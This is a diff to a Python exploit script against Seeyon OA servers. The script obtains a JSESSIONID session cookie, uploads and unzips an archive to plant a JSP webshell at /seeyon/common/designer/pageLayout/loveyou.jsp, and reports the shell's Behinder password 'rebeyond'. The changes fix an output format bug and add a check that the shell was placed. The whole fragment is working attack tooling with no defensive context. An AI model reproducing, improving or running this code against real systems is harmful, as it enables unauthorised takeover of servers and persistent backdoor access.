@@ -21,7 +21,7 @@ def get_session(url, attack):
             cookies = requests.utils.dict_from_cookiejar(r.cookies)
             cookie = cookies['JSESSIONID']
             if attack:
-                print('\033[32m[#]成功获取到session：\033[0m'.format(cookie))
+                print('\033[32m[#]成功获取到session：{0}\033[0m'.format(cookie))
                 fileUpload(url, cookie, name)
             else:
                 core.end_echo(name, 'session:' + cookie)
@@ -57,12 +57,13 @@ def unzip(header, url, firename, cookie, name):
     header['Content-Type'] = 'application/x-www-form-urlencoded'
     print('\033[32m[#]开始解压\033[0m')
     r = core.post(url, path, header, data)
-    if r.status_code == 500:
+    r2 = core.get(url, "/seeyon/common/designer/pageLayout/loveyou.jsp")
+    if r.status_code == 500 and r2.status_code == 200:
         print('\033[32m[#]解压成功\033[0m')
-        print('\033[32m[#]webshell地址为：{}/seeyon/common/designer/pageLayout/test233.jsp\033[0m'.format(url))
+        print('\033[32m[#]webshell地址为：{}/seeyon/common/designer/pageLayout/loveyou.jsp\033[0m'.format(url))
         print('\033[32m[#]冰蝎密码为：rebeyond\033[0m')
         print('\033[34m---------------------------------------------------\033[0m')
-        core.result(name, url + '/seeyon/common/designer/pageLayout/test233.jsp',
+        core.result(name, url + '/seeyon/common/designer/pageLayout/loveyou.jsp',
                     'rebeyond	' + 'JSESSIONID=%s' % cookie)
     else:
         print('\033[34m[#]解压失败\033[0m')
